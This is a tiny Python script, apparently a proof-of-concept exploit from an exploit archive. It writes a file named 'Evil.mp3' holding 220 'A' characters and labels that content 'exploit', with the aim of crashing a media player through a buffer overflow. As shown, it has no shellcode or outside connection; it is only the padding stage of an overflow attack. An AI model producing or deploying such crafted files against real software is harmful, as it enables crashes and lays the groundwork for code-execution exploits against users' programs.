# !/usr/bin/python

filename = "Evil.mp3"
 
buffer = "\x41" * 220
exploit = buffer
 
textfile = open(filename , 'w')
textfile.write(exploit)
textfile.close()
